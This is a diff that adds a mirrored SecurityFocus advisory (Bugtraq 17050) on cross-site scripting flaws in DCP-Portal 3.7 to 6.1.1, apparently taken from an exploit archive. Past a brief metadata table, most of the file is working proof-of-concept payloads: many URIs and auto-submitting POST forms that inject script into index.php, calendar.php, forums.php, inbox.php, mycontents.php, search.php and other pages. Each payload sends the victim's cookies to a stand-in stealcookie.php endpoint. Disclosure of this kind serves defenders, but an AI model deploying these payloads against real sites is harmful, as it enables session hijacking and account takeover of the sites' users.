@@ -1,0 +1,137 @@
+#SpeeDr00t@Black Falcon<br>#bid17050<p><b><span style="font-size: 18pt;">DCP Portal Multiple Cross-Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/17050/info">info</a><br><a href="http://www.securityfocus.com/bid/17050/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/17050/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/17050/solution">solution</a><br><a href="http://www.securityfocus.com/bid/17050/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				17050
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 09 2006 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 11 2006 06:10AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Nenad Jovanovic of Technical University of Vienna is credited with the discovery of these vulnerabilities.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					DCP-Portal DCP-Portal 6.1.1 <br/>
+					
+				
+					DCP-Portal DCP-Portal 6.1 <br/>
+					
+				
+					DCP-Portal DCP-Portal 6.0 <br/>
+					
+				
+					DCP-Portal DCP-Portal 5.3.2 <br/>
+					
+				
+					DCP-Portal DCP-Portal 5.3.1 <br/>
+					
+				
+					DCP-Portal DCP-Portal 5.3 <br/>
+					
+				
+					DCP-Portal DCP-Portal 5.2 <br/>
+					
+				
+					DCP-Portal DCP-Portal 5.1 <br/>
+					
+				
+					DCP-Portal DCP-Portal 5.0.2 <br/>
+					
+				
+					DCP-Portal DCP-Portal 5.0.1 <br/>
+					
+				
+					DCP-Portal DCP-Portal 4.5.1 <br/>
+					
+				
+					DCP-Portal DCP-Portal 4.2 <br/>
+					
+				
+					DCP-Portal DCP-Portal 4.1 <br/>
+					
+				
+					DCP-Portal DCP-Portal 4.0 <br/>
+					
+				
+					DCP-Portal DCP-Portal 3.7 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	This issue can be exploited through use of a web client.<br/><br/>The following proof-of-concept URIs are available:<br/>http://www.example.com/dcp-portal611/index.php?page=documents&amp;dl=xyz&amp;its_url=xyz.html"&gt;&lt;script type="text/javascript"&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt;<br/>http://www.example.com/dcp-portal611/index.php?page=send_write&amp;url=xyz.html"&gt;&lt;script type="text/javascript"&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt;<br/>http://www.example.com/dcp-portal611/calendar.php?subject_color="&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt;<br/>http://www.example.com/dcp-portal611/calendar.php?images="&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt;<br/>http://www.example.com/dcp-portal611/calendar.php?day=&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt; <br/><br/>&lt;form action='http://www.example.com/dcp-portal611/calendar.php?show=full_month&amp;month=02&amp;day="&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt;' method="post"&gt;<br/>    &lt;input type="text" name="year" value='2006' /&gt;<br/>    &lt;input type="submit"&gt;<br/>  &lt;/form&gt;<br/>  &lt;script type="text/javascript"&gt;<br/>    document.forms0.submit();<br/>  &lt;/script&gt;<br/><br/>http://www.example.com/dcp-portal611/calendar.php?year=&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt;<br/> <br/>  &lt;form action='http://www.example.com/dcp-portal611/forums.php?action=board&amp;bid=1' method="post"&gt;<br/>    &lt;input type="text" name="bid" value='"&gt;&lt;/a&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"+document.cookie&lt;/script&gt;' /&gt;<br/>    &lt;input type="submit"&gt;<br/>  &lt;/form&gt;<br/>  &lt;script type="text/javascript"&gt;<br/>    document.forms0.submit();<br/>  &lt;/script&gt;<br/><br/>http://www.example.com/dcp-portal611/forums.php?action=board&amp;bid="&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt;<br/>http://www.example.com/dcp-portal611/forums.php?action=addtopic&amp;bid=1&amp;replying_msg=&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt; <br/><br/>&lt;form action='http://www.example.com/dcp-portal611/forums.php?action=addtopic&amp;bid=1' method="post"&gt;<br/>    &lt;input type="text" name="subject" value='"&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"+document.cookie&lt;/script&gt;' /&gt;<br/>    &lt;input type="submit"&gt;<br/>  &lt;/form&gt;<br/>  &lt;script type="text/javascript"&gt;<br/>    document.forms0.submit();<br/>  &lt;/script&gt;<br/><br/>&lt;form action='http://www.example.com/dcp-portal611/forums.php?action=addtopic&amp;bid=1' method="post"&gt;<br/>    &lt;input type="text" name="body" value='"&gt;&lt;/textarea&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"+document.cookie&lt;/script&gt;' /&gt;<br/>    &lt;input type="submit"&gt;<br/>  &lt;/form&gt;<br/>  &lt;script type="text/javascript"&gt;<br/>    document.forms0.submit();<br/>  &lt;/script&gt;<br/><br/>http://www.example.com/dcp-portal611/forums.php?action=addtopic&amp;bid=1&amp;mid="&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt;<br/><br/>&lt;form action='http://www.example.com/dcp-portal611/forums.php?action=savemsg' method="post"&gt;<br/>    &lt;input type="text" name="bid" value='"&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"+document.cookie&lt;/script&gt;' /&gt;<br/>    &lt;input type="submit"&gt;<br/>  &lt;/form&gt;<br/>  &lt;script type="text/javascript"&gt;<br/>    document.forms0.submit();<br/>  &lt;/script&gt;<br/><br/>&lt;form action='http://www.example.com/dcp-portal611/inbox.php?action=send' method="post"&gt;<br/>    &lt;input type="text" name="subject" value='"&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"+document.cookie&lt;/script&gt;' /&gt;<br/>    &lt;input type="text" name="message" value='' /&gt;<br/>    &lt;input type="submit"&gt;<br/>  &lt;/form&gt;<br/>  &lt;script type="text/javascript"&gt;<br/>    document.forms0.submit();<br/>  &lt;/script&gt;<br/><br/>&lt;form action='http://www.example.com/dcp-portal611/inbox.php?action=send' method="post"&gt;<br/>    &lt;input type="text" name="message" value='"&gt;&lt;/textarea&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"+document.cookie&lt;/script&gt;' /&gt;<br/>    &lt;input type="text" name="subject" value='' /&gt;<br/>    &lt;input type="submit"&gt;<br/>  &lt;/form&gt;<br/>  &lt;script type="text/javascript"&gt;<br/>    document.forms0.submit();<br/>  &lt;/script&gt;<br/><br/>&lt;form action='http://www.example.com/dcp-portal611/inbox.php?action=delete&amp;subject="&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt;' method="post"&gt;<br/>    &lt;input type="submit" name="submit" value='Reply'&gt;<br/>  &lt;/form&gt;<br/>  &lt;script type="text/javascript"&gt;<br/>    document.forms0.submit();<br/>  &lt;/script&gt;<br/><br/>&lt;form action='http://www.example.com/dcp-portal611/inbox.php?action=delete&amp;message="&gt;&lt;/textarea&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt;' method="post"&gt;<br/>    &lt;input type="submit" name="submit" value='Reply'&gt;<br/>  &lt;/form&gt;<br/>  &lt;script type="text/javascript"&gt;<br/>    document.forms0.submit();<br/>  &lt;/script&gt;<br/><br/>http://www.example.com/dcp-portal611/lostpassword.php?subject_color="&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt;<br/>http://www.example.com/dcp-portal611/lostpassword.php?email="&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt;<br/>http://www.example.com/dcp-portal611/mycontents.php?action=content&amp;c_name="&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt;<br/>http://www.example.com/dcp-portal611/mycontents.php?action=content&amp;content_inicial=&lt;/textarea&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt; <br/>http://www.example.com/dcp-portal611/mycontents.php?action=content&amp;c_name="&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt;  <br/>http://www.example.com/dcp-portal611/mycontents.php?action=addnews&amp;c_name="&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt;<br/>http://www.example.com/dcp-portal611/mycontents.php?action=addnews&amp;content_inicial=&lt;/textarea&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt; <br/>http://www.example.com/dcp-portal611/mycontents.php?action=addnews&amp;mode=write&amp;dcp_editor_contingut_html=xyz&amp;c_name=&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt;&amp;c_image_name=<br/>http://www.example.com/dcp-portal611/mycontents.php?action=addanns&amp;c_name="&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt;<br/>http://www.example.com/dcp-portal611/mycontents.php?action=updatecontent&amp;cid="&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt; <br/>http://www.example.com/dcp-portal611/mycontents.php?action=updatecontent&amp;cid=1&amp;mode=write&amp;c_image_name=xyz&amp;c_name="&gt;&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt; <br/><br/>&lt;form action='http://www.example.com/dcp-portal611/search.php?field=&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie&lt;/script&gt;' method="post"&gt;<br/>    &lt;input type="text" name="q" value="xyz"/&gt;<br/>    &lt;input type="text" name="query" value="true"/&gt;<br/>    &lt;input type="text" name="return" value="tid, title, body"/&gt;<br/>    &lt;input type="text" name="table" value="dcp5_forum_messages"/&gt;<br/>    &lt;input type="text" name="id_col" value="tid"/&gt;<br/>    &lt;input type="submit"&gt;<br/>  &lt;/form&gt;<br/>  &lt;script type="text/javascript"&gt;<br/>    document.forms0.submit();<br/>  &lt;/script&gt;<br/><br/>&lt;form action='http://www.example.com/dcp-portal611/search.php' method="post"&gt;<br/>    &lt;input type="text" name="q" value='&lt;script&gt;document.location="http://www.example.com/stealcookie.php?"+document.cookie&lt;/script&gt; method="post"&gt;'/&gt;<br/>    &lt;input type="text" name="query" value="true"/&gt;<br/>    &lt;input type="text" name="return" value="tid, title, body"/&gt;<br/>    &lt;input type="text" name="table" value="dcp5_forum_messages"/&gt;<br/>    &lt;input type="text" name="id_col" value="tid"/&gt;<br/>    &lt;input type="submit"&gt;<br/>  &lt;/form&gt;<br/>  &lt;script type="text/javascript"&gt;<br/>    document.forms0.submit();<br/>  &lt;/script&gt;
+	
+		<ul>
+</ul>
+</div>
